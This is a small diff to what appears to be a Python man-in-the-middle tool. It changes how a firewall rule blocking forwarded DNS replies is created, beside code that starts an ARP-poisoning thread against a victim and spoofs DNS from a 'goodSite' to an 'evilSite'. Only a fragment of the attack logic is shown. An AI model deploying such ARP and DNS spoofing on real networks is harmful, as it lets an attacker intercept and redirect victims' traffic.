@@ -56,7 +56,8 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
 def main() :
     pktCounter = 0
     stop_dns = pyptables.Rule(proto='udp', sport='53')
-    pyptables.tables['filter']['FORWARD'].append(stop_dns(jump='REJECT'))
+    tables = default_tables()
+    tables['filter']['FORWARD'].append(stop_dns(jump='REJECT'))
     arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
     arpThread.start()
     while True: 
